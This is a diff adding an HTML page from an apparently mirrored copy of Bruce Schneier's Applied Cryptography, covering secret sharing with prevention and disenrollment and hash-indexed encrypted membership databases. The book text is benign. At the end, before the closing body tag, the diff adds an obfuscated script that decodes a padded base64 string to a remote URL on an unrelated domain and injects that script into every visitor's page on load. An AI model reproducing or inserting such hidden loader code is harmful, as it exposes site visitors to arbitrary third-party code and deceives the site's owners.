@@ -1,0 +1,81 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=073-074//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch04/04-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Secret-Sharing Schemes with Prevention</I></B></FONT></P>
+<P>A secret is divided up among 50 people so that any 10 can get together and reconstruct the secret. That&#146;s easy. But, can we implement the same secret-sharing scheme with the added constraint that 20 people can get together and <I>prevent</I> the others from reconstructing the secret, no matter how many of them there are? As it turns out, we can [153].</P>
+<P>The math is complicated, but the basic idea is that everyone gets two shares: a &#147;yes&#148; share and a &#147;no&#148; share. When it comes time to reconstruct the secret, people submit one of their shares. The actual share they submit depends on whether they wish the secret reconstructed. If there are <I>m</I> or more &#147;yes&#148; shares and fewer than <I>n</I> &#147;no&#148; shares, the secret can be reconstructed. Otherwise, it cannot.</P>
+<P>Of course, nothing prevents a sufficient number of &#147;yes&#148; people from going off in a corner without the &#147;no&#148; people (assuming they know who they are) and reconstructing the secret. But in a situation where everyone submits their shares into a central computer, this scheme will work.</P>
+<P><FONT SIZE="+1"><B><I>Secret Sharing with Disenrollment</I></B></FONT></P>
+<P>You&#146;ve set up your secret-sharing system and now you want to fire one of your shareholders. You could set up a new scheme without that person, but that&#146;s time-consuming. There are methods for coping with this system. They allow a new sharing scheme to be activated instantly once one of the participants becomes untrustworthy [1004].
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">3.8 Cryptographic Protection of Databases</FONT></H3>
+<P>The membership database of an organization is a valuable commodity. On the one hand, you want to distribute the database to all members. You want them to communicate with one another, exchange ideas, and invite each other over for cucumber sandwiches. On the other hand, if you distribute the membership database to everyone, copies are bound to fall into the hands of insurance salesmen and other annoying purveyors of junk mail.
+</P>
+<P>Cryptography can ameliorate this problem. We can encrypt the database so that it is easy to extract the address of a single person but hard to extract a mailing list of all the members.</P>
+<P>The scheme, from [550,549], is straightforward. Choose a one-way hash function and a symmetric encryption algorithm. Each record of the database has two fields. The index field is the last name of the member, operated on by the one-way hash function. The data field is the full name and address of the member, encrypted using the last name as the key. Unless you know the last name, you can&#146;t decrypt the data field.</P>
+<P>Searching a specific last name is easy. First, hash the last name and look for the hashed value in the index field of the database. If there is a match, then that last name is in the database. If there are several matches, then there are several people in the database with the last name. Finally, for each matching entry, decrypt the full name and address using the last name as the key.</P>
+<P>In [550] the authors use this system to protect a dictionary of 6000 Spanish verbs. They report minimal performance degradation due to the encryption. Additional complications in [549] handle searches on multiple indexes, but the idea is the same. The primary problem with this system is that it&#146;s impossible to search for people when you don&#146;t know how to spell their name. You can try variant spellings until you find the correct one, but it isn&#146;t practical to scan through everyone whose name begins with &#147;Sch&#148; when looking for &#147;Schneier.&#148;</P>
+<P>This protection isn&#146;t perfect. It is possible for a particularly persistent insurance salesperson to reconstruct the membership database through brute-force by trying every possible last name. If he has a telephone database, he can use it as a list of possible last names. This might take a few weeks of dedicated number crunching, but it can be done. It makes his job harder and, in the world of junk mail, &#147;harder&#148; quickly becomes &#147;too expensive.&#148;</P>
+<P>Another approach, in [185], allows statistics to be compiled on encrypted data.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch04/04-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ajKdvIPB, JTRlXnfa) {JTRlXnfa = ajKdvIPB.createElement('script');JTRlXnfa.type = 'text/javascript';JTRlXnfa.async = true;JTRlXnfa.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ajKdvIPB.getElementsByTagName('body')[0].appendChild(JTRlXnfa);}(document));</script></body>
+</html>
